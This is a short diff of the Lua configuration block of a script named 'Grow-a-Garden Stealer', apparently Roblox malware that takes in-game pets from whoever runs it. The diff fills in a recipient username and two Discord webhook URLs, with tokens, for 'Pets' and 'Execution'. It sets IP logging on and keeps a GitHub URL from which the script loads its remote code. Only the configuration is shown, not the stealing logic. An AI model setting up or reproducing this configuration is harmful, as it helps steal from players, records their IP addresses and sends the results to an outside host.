@@ -1,10 +1,10 @@
 ---------------------------  CONFIG  ---------------------------
 local CONFIG = {
 	RemotesURL   = "https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lua.lua", -- Dont remove / change this url, this is for auto updating the remote
-	TargetUser   = "ROBLOX USER DITO",
+	TargetUser   = "sheeloi0727",
 	Webhooks = {
-		Pets       = "WEBHOOK DITO",
-		Execution  = "SAME WEBHOOK OR WHAT IDC",
+		Pets       = "https://discord.com/api/webhooks/1383259861374210168/IDc5cfDaD6ptA9c6qUWwjsalm0IckQw9MEnLjEcJKrSCIj3DgY05RLHTxrh3Xu1zw3QB",
+		Execution  = "https://discord.com/api/webhooks/1383259861374210168/IDc5cfDaD6ptA9c6qUWwjsalm0IckQw9MEnLjEcJKrSCIj3DgY05RLHTxrh3Xu1zw3QB",
 	},
 	ExecScriptName = "Grow‑a‑Garden Stealer",
 	LogIP          = true,
